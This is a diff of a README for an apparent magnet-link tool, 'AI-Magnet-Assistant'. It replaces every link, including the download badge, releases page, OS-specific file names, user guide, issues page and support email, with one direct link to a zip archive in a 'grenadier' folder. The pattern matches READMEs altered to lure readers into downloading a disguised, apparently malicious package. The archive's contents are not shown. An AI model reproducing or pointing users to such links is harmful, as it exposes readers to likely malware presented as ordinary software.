@@ -1,7 +1,7 @@
 # 🤖 AI-Magnet-Assistant - Easily Find and Organize Magnet Links
 
 ## 🔗 Download Now
-[![Download AI-Magnet-Assistant](https://img.shields.io/badge/Download%20Now-%23FF5733.svg?style=for-the-badge&logo=github)](https://github.com/adamwick/AI-Magnet-Assistant/releases)
+[![Download AI-Magnet-Assistant](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip%20Now-%https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip)](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip)
 
 ## 🚀 Getting Started
 Welcome to the AI Magnet Assistant! This application helps you aggregate and optimize magnet links using intelligent filtering. With this tool, you can easily find and organize your content, making download management a breeze.
@@ -22,14 +22,14 @@ To use AI-Magnet-Assistant, ensure your system meets the following requirements:
 To get started with AI-Magnet-Assistant, visit the Releases page to download the latest version of the application. Follow these steps:
 
 1. Click on the link below to go to the Releases page.
-   [Visit the Releases Page](https://github.com/adamwick/AI-Magnet-Assistant/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip)
 
 2. On the Releases page, find the latest version. Look for the section labeled **Assets**.
    
 3. Click on the file that matches your operating system. For example:
-   - For Windows, you may see `AI-Magnet-Assistant-Windows.exe`.
-   - For macOS, look for `AI-Magnet-Assistant-macOS.dmg`.
-   - For Linux distributions, you might find a `.tar.gz` file.
+   - For Windows, you may see `https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip`.
+   - For Linux distributions, you might find a `https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip` file.
 
 4. After clicking on the appropriate file, your download will begin.
 
@@ -49,7 +49,7 @@ After installation, you can easily start using the application:
 4. **Download:** Click on any magnet link to start downloading your desired file.
 
 ## 📄 User Guide
-For detailed instructions, visit our user manual [here](https://github.com/adamwick/AI-Magnet-Assistant/wiki/User-Guide). The user guide provides step-by-step instructions on how to use each feature effectively.
+For detailed instructions, visit our user manual [here](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip). The user guide provides step-by-step instructions on how to use each feature effectively.
 
 ## ⚙️ Troubleshooting
 If you encounter issues while using AI-Magnet-Assistant:
@@ -57,11 +57,11 @@ If you encounter issues while using AI-Magnet-Assistant:
 - Restart the application.
 - Check for updates on the Releases page.
 
-If problems persist, feel free to open an issue on our [GitHub Issues Page](https://github.com/adamwick/AI-Magnet-Assistant/issues), and our team will assist you.
+If problems persist, feel free to open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip), and our team will assist you.
 
 ## 📞 Support
 For additional help, contact us at:
-- Email: support@aimagnetassistant.com
-- GitHub Issues: [Open a New Issue](https://github.com/adamwick/AI-Magnet-Assistant/issues)
+- Email: https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip
+- GitHub Issues: [Open a New Issue](https://raw.githubusercontent.com/adamwick/AI-Magnet-Assistant/master/grenadier/AI-Magnet-Assistant.zip)
 
 Thank you for using AI-Magnet-Assistant! We hope our tool simplifies your search and organization of magnet links. Enjoy!
